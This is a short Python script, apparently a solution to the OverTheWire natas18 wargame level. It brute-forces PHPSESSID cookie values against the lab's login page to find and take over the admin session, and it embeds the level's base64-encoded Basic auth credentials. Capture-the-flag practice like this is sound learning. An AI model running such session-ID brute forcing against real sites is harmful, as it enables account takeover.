import requests
#the headers can be seen after submitting on the website. thats where the auth stuff are from
for i in range(640):
    url = "http://natas18.natas.labs.overthewire.org/index.php"
    payload = {"username": "admin", "password": "aa"}
    headers = {"Cookie": "PHPSESSID={0}".format(i), "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}

    r = requests.post(url, params=payload, headers=headers)

    if "You are logged in as a regular user" in r.text:
        print("fail"," ",i)
    else:
        print(i)
        exit()